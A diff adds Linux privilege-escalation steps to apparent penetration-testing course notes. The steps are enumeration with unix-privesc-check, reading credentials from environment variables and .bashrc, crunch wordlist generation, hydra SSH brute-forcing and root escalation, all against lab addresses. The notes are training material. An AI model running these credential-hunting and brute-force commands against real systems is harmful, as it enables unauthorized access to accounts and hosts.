@@ -1364,7 +1364,23 @@ Reference
     `/sbin/modinfo libata`  
   - 2 special right setuid, setgid
     `find / -perm -u=s -type f 2>/dev/null`
-- exposed confidential info  
+  - Automated enumeration
+    `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`: transfer script to target
+    `joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt`  
+- exposed confidential info
+  - inspect env variables > SCRIPT_CREDENTIALS=lab
+    `env`
+  - inspect .bashrc > export SCRIPT_CREDENTIALS="lab"
+    `cat .bashrc`
+  - escalate privilege by typing the found password
+    `su - root` 'whoami' (use root password)
+  - generate a wordlist of bruteforce attack
+    `crunch 6 6 -t Lab%%% > wordlist`
+  - use hydra to brute force ssh > Lab123 > ssh eve@192.168.50.214
+    `hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`
+  - elevate to root 
+    `sudo -i` `whoami`	(use user's password)
+  - dd    
 - insecure file permission  
 - abuse system linux components  
 
